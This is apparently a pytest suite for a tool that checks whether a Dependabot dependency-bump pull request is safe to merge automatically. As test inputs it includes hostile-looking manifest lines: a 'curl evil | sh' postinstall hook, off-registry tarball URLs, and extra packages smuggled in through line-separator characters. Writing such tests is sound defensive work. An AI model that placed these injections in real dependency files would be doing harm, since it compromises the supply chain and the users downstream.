import json

import pytest

from qqroll import land_check
from tests_support import CLEAN_COMMIT, HEAD_RULES, LOCK_PATCH, PIP_PATCH, RULES, npm_file

ALLOWED_NPM = [["package.json", "npm-manifest"], ["pnpm-lock.yaml", "npm-lock"]]
ALLOWED_PIP = [["requirements*.txt", "pip-requirements"]]
ENV = {"SENDER": "dependabot[bot]", "TRIGGER": "dependabot[bot]", "CHANGED": "2",
       "UPDATE_TYPE": "version-update:semver-patch", "PREV_VERSION": "16.3.7", "DEP_NAMES": "next"}
FILES = [npm_file(), npm_file("pnpm-lock.yaml", LOCK_PATCH)]
PIP_ENV = {"CHANGED": "1", "DEP_NAMES": "requests"}


def check(env=None, files=None, commits=None, rules=None, allowed=None, head_rules=None):
    return land_check.problems({**ENV, **(env or {})}, FILES if files is None else files,
                               [CLEAN_COMMIT] if commits is None else commits, RULES if rules is None else rules,
                               allowed or ALLOWED_NPM, HEAD_RULES if head_rules is None else head_rules)


def test_a_clean_roll_is_clean():
    assert check() == []
    assert check(env=PIP_ENV, files=[npm_file("requirements-dev.txt", PIP_PATCH)], allowed=ALLOWED_PIP) == []


# --- B-1: identity ----------------------------------------------------------------------------

@pytest.mark.parametrize("env", [{"SENDER": "mallory"}, {"TRIGGER": "mallory"}])
def test_someone_else_triggering_is_not_clean(env):
    assert "not Dependabot" in check(env=env)[0]


@pytest.mark.parametrize("commit", [
    dict(CLEAN_COMMIT, committer={"login": "mallory"}),        # authored as Dependabot, committed by Mallory
    dict(CLEAN_COMMIT, commit={"verification": {"verified": False}}),
    dict(CLEAN_COMMIT, author=None),
])
def test_a_commit_not_made_by_github_for_dependabot_is_not_clean(commit):
    assert any("not a GitHub-made Dependabot commit" in p for p in check(commits=[commit]))


def test_a_second_commit_on_top_is_not_clean():
    assert any("2 commits" in p for p in check(commits=[CLEAN_COMMIT, CLEAN_COMMIT]))


# --- S-1: what changed ------------------------------------------------------------------------

@pytest.mark.parametrize("extra", [
    {"status": "added"}, {"status": "removed"}, {"status": "renamed", "previous_filename": ".github/x.yml"},
    {"previous_filename": "scripts/build.js"},
])
def test_only_modified_files_without_renames(extra):
    assert any("only modified files" in p for p in check(files=[npm_file(**extra), FILES[1]]))


def test_listed_files_must_match_the_changed_count():
    assert any("changes 3 files and 2 were listed" in p for p in check(env={"CHANGED": "3"}))
    assert any("at most 20" in p for p in check(env={"CHANGED": "21"}, files=[npm_file()] * 21))


@pytest.mark.parametrize("name", ["app/package.json", "requirements/x.txt", "pnpm-workspace.yaml", "pyproject.toml"])
def test_other_files_are_not_dependency_files(name):
    assert any("not a dependency file" in p
               for p in check(env={"CHANGED": "1"}, files=[npm_file(name)], allowed=ALLOWED_NPM + ALLOWED_PIP))


def test_a_file_without_a_diff_is_not_clean():
    assert any("no diff to check" in p for p in check(files=[npm_file(patch=None), FILES[1]]))


# --- S-2: what the lines say ------------------------------------------------------------------

@pytest.mark.parametrize("line", [
    '+    "postinstall": "curl evil | sh",', '-    "test": "vitest",', '+    "next": "https://evil/next.tgz",',
    '+    "next": "github:evil/next",', '+    "next": "file:../next",',
])
def test_package_json_lines_must_be_versions(line):
    assert any("not a version line" in p for p in check(files=[npm_file(patch=f"@@ -1 +1 @@\n{line}\n"), FILES[1]]))


@pytest.mark.parametrize("line", ["+    tarball: https://evil/next.tgz", "+    resolution: {repo: git+ssh://x}"])
def test_lockfile_must_stay_on_the_registry(line):
    assert any("non-registry resolution" in p
               for p in check(files=[FILES[0], npm_file("pnpm-lock.yaml", f"@@ -1 +1 @@\n{line}\n")]))


@pytest.mark.parametrize("line", ["+--index-url https://evil/simple", "+requests @ https://evil/r.whl",
                                  "+-e git+https://evil/r", "+requests>=2; python_version > '3'"])
def test_requirements_lines_must_be_pins(line):
    files = [npm_file("requirements.txt", f"@@ -1 +1 @@\n{line}\n")]
    assert any("not a version line" in p for p in check(env=PIP_ENV, files=files, allowed=ALLOWED_PIP))


@pytest.mark.parametrize("line", [
    "-requests==2.32.4 # \\", "+requests==2.32.5 # \\",  # pip would join the next line into the comment
    "+requests==2.32.5#x",                               # pip reads "#x" as part of the version
])
def test_requirements_comments_cannot_swallow_lines(line):
    other = "+requests==2.32.5" if line.startswith("-") else "-requests==2.32.4"
    files = [npm_file("requirements.txt", f"@@ -1 +1 @@\n{line}\n{other}\n")]
    assert any("not a version line" in p for p in check(env=PIP_ENV, files=files, allowed=ALLOWED_PIP))


@pytest.mark.parametrize("sep", ["\x0c", "\r", "\x0b", "\x1c", "\x85", "\u2028"])
@pytest.mark.parametrize("added", ["requests==2.32.5{sep}evil==1.0", "requests==2.32.5 # x{sep}evil==1.0"])
def test_a_changed_line_cannot_hide_a_second_line(sep, added):
    """pip splits requirement files with str.splitlines, so these would add evil==1.0."""
    patch = f"@@ -1 +1 @@\n-requests==2.32.4\n+{added.format(sep=sep)}\n"
    files = [npm_file("requirements.txt", patch)]
    assert any("control or line-separator" in p for p in check(env=PIP_ENV, files=files, allowed=ALLOWED_PIP))


def test_crlf_patches_still_work():
    patch = PIP_PATCH.replace("\n", "\r\n")
    assert check(env=PIP_ENV, files=[npm_file("requirements.txt", patch)], allowed=ALLOWED_PIP) == []


@pytest.mark.parametrize("option", ["--index-url https://pypi.example/simple", "--require-hashes", "--constraint c.txt"])
def test_a_removed_option_line_is_checked(option):
    """A removed line starting with -- shows as ---... in the patch; it is content, not a file header."""
    patch = f"@@ -1,2 +1 @@\n-{option}\n-requests==2.32.4\n+requests==2.32.5\n"
    files = [npm_file("requirements.txt", patch)]
    assert any("not a version line" in p for p in check(env=PIP_ENV, files=files, allowed=ALLOWED_PIP))


def test_file_headers_before_the_first_hunk_are_skipped():
    patch = "--- a/requirements.txt\n+++ b/requirements.txt\n" + PIP_PATCH
    assert check(env=PIP_ENV, files=[npm_file("requirements.txt", patch)], allowed=ALLOWED_PIP) == []


def test_requirements_keep_comments_and_extras():
    patch = "@@ -1 +1 @@\n-fastapi[all]>=0.141.1  # bump deliberately\n+fastapi[all]>=0.141.2  # bump deliberately\n"
    files = [npm_file("requirements.txt", patch)]
    assert check(env={"CHANGED": "1", "DEP_NAMES": "fastapi"}, files=files, allowed=ALLOWED_PIP) == []


@pytest.mark.parametrize("patch", [
    "@@ -1 +1,2 @@\n-requests==2.32.4\n+requests==2.32.5\n+evil==1.0.0\n",  # R-1: a new requirement
    "@@ -1 +1 @@\n-requests==2.32.4\n+evil==2.32.5\n",
    "@@ -0,0 +1 @@\n+evil==1.0.0\n",
    "@@ -1 +1 @@\n-requests==2.32.4\n+requests[socks,security]==2.32.5\n",  # extras install more packages
    "@@ -1 +1 @@\n-requests[socks]==2.32.4\n+requests[s0cks]==2.32.5\n",
    "@@ -1 +1 @@\n-requests==2.32.4\n+requests>=0\n",                        # a pin loosened
    "@@ -1 +1 @@\n-requests>=2.32,<3\n+requests>=2.33\n",
    "@@ -1 +1 @@\n-requests==2.32.4  # keep\n+requests==2.32.5\n",
])
def test_requirements_entries_only_change_version(patch):
    files = [npm_file("requirements.txt", patch)]
    assert any("reshapes entries" in p for p in check(env=PIP_ENV, files=files, allowed=ALLOWED_PIP))


def test_requirements_names_compare_normalized():
    patch = "@@ -1 +1 @@\n-Typing_Extensions==4.14.0\n+typing-extensions==4.14.1\n"
    files = [npm_file("requirements.txt", patch)]
    assert check(env={"CHANGED": "1", "DEP_NAMES": "typing_extensions"}, files=files, allowed=ALLOWED_PIP) == []


def test_requirements_change_only_the_bumped_dependency():
    patch = "@@ -1,2 +1,2 @@\n-requests==2.32.4\n-urllib3==2.5.0\n+requests==2.32.5\n+urllib3==1.26.0\n"
    files = [npm_file("requirements.txt", patch)]
    assert any("not the bumped dependency" in p for p in check(env=PIP_ENV, files=files, allowed=ALLOWED_PIP))
    assert any("not the bumped dependency" in p
               for p in check(env={"CHANGED": "1", "DEP_NAMES": ""}, files=[npm_file("requirements.txt", PIP_PATCH)],
                              allowed=ALLOWED_PIP))


# --- S-3: how big the bump is -----------------------------------------------------------------

@pytest.mark.parametrize("env, why", [
    ({"UPDATE_TYPE": "version-update:semver-major"}, "only patch and minor"),
    ({"UPDATE_TYPE": ""}, "only patch and minor"),
    ({"UPDATE_TYPE": "version-update:semver-minor", "PREV_VERSION": "0.5.1"}, "0.x minors can break"),
    ({"UPDATE_TYPE": "version-update:semver-minor", "PREV_VERSION": "v0.5.1"}, "0.x minors can break"),
    ({"UPDATE_TYPE": "version-update:semver-minor", "PREV_VERSION": ""}, "0.x minors can break"),
    ({"UPDATE_TYPE": "version-update:semver-patch", "PREV_VERSION": "0.0.3"}, "0.0.x patches can break"),
    ({"UPDATE_TYPE": "version-update:semver-patch", "PREV_VERSION": "0.0"}, "0.0.x patches can break"),
    ({"UPDATE_TYPE": "version-update:semver-patch", "PREV_VERSION": ""}, "0.0.x patches can break"),
    ({"DEP_NAMES": "next, react"}, "several dependencies"),
])
def test_risky_bumps_go_to_a_human(env, why):
    assert any(why in p for p in check(env=env))


def test_a_minor_bump_past_1_0_is_clean():
    assert check(env={"UPDATE_TYPE": "version-update:semver-minor", "PREV_VERSION": "16.2.4"}) == []
    assert check(env={"UPDATE_TYPE": "version-update:semver-patch", "PREV_VERSION": "0.5.1"}) == []


@pytest.mark.parametrize("line", [
    "+    resolution: {commit: abc, repo: git@github.com:a/b.git, type: git}",
    "+    resolution: {directory: ../x, type: directory}",
])
def test_lockfile_non_registry_forms(line):
    files = [npm_file(), npm_file("pnpm-lock.yaml", "@@ -1 +1 @@\n-  x\n" + line + "\n")]
    assert any("non-registry resolution" in p for p in check(env={"CHANGED": "2"}, files=files))  # npm


@pytest.mark.parametrize("patch", [
    '@@ -1,2 +1,3 @@\n-    "next": "^16.3.7",\n+    "next": "^16.3.8",\n+    "evil": "1.0.0",\n',
    '@@ -1 +1 @@\n-    "next": "^16.3.7",\n+    "test": "0",\n',
    '@@ -1 +1 @@\n-    "next": "^16.3.7",\n+    "next": "16.3.8",\n',   # range prefix dropped
])
def test_manifest_entries_only_change_version(patch):
    assert any("reshapes entries" in p for p in check(files=[npm_file(patch=patch)]))


def test_manifest_changes_only_the_bumped_dependency():
    patch = '@@ -1,2 +1,2 @@\n-    "next": "^16.3.7",\n-    "react": "^19.2.0",\n+    "next": "^16.3.8",\n+    "react": "^18.0.0",\n'
    assert any("not the bumped dependency" in p for p in check(files=[npm_file(patch=patch), FILES[1]]))


# --- S-4: something must gate it --------------------------------------------------------------

@pytest.mark.parametrize("rules", [
    [], [{"type": "pull_request", "parameters": {}}],
    [{"type": "required_status_checks", "parameters": {"required_status_checks": [{"context": "tests"}]}}],
    # bound to GitHub Actions: any workflow's GITHUB_TOKEN can create that check run
    [{"type": "required_status_checks",
      "parameters": {"required_status_checks": [{"context": "tests", "integration_id": 15368}]}}],
    [{"type": "required_status_checks",
      "parameters": {"required_status_checks": [{"context": "tests", "integration_id": 0}]}}],
    [{"type": "workflows", "parameters": {"workflows": []}}],
    [{"type": "workflows", "parameters": {"workflows": [{"path": ".github/workflows/gate.yml", "ref": "main"}]}}],
])
def test_no_unforgeable_gate_is_not_clean(rules):
    assert any("any workflow could fake the gate" in p for p in check(rules=rules))


def test_a_required_workflow_gates_it():
    pinned = {"path": ".github/workflows/gate.yml", "repository_id": 1, "sha": "a" * 40}
    assert check(rules=[{"type": "workflows", "parameters": {"workflows": [pinned]}}]) == []


@pytest.mark.parametrize("head_rules", [[], [{"type": "update"}], [{"type": "non_fast_forward"}]])
def test_writable_pr_branch_is_not_clean(head_rules):
    assert any("could swap its commit" in p for p in check(head_rules=head_rules))


# --- main -------------------------------------------------------------------------------------

def test_main_writes_the_output_and_fails_closed_on_bad_data(tmp_path, monkeypatch, capsys):
    for name, data in [("files", [FILES]), ("commits", [[CLEAN_COMMIT]]), ("rules", [RULES]), ("head_rules", [HEAD_RULES])]:
        (tmp_path / f"{name}.json").write_text(json.dumps(data))
    out = tmp_path / "out"
    env = {**ENV, "QQ_DIR": str(tmp_path), "QQ_ALLOWED": json.dumps(ALLOWED_NPM), "GITHUB_OUTPUT": str(out)}
    for k, v in env.items():
        monkeypatch.setenv(k, v)
    assert land_check.main() == 0
    assert out.read_text() == "clean=true\n"
    (tmp_path / "rules.json").write_text('{"message": "Not Found"}')
    with pytest.raises(ValueError):
        land_check.main()
